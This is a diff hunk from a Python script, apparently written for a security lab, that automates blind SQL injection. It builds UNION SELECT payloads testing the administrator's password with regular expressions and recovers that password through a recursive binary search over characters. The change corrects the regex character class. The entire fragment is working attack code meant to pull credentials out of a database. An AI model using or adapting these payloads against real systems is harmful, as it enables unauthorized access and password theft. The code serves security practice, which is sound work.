@@ -90,8 +90,8 @@ def binary_search(url):
     incomplete_password = True  # Flag, to keep the program going until a whole password is found, which is set by finding a exact match
     middle_seperator_of_valid_character_set = len(valid_character_set) // 2
 
-    query_left = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{valid_character_set[:middle_seperator_of_valid_character_set]}'--"
-    query_right = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{valid_character_set[middle_seperator_of_valid_character_set:]}'--"
+    query_left = f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{valid_character_set[:middle_seperator_of_valid_character_set]}]'--"
+    query_right = f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{valid_character_set[middle_seperator_of_valid_character_set:]}]'--"
     if try_query(query_left):
         administrator_password = recursive_binary_search(valid_character_set[:middle_seperator_of_valid_character_set], len(valid_character_set[:middle_seperator_of_valid_character_set]), administrator_password)
     elif try_query(query_right):
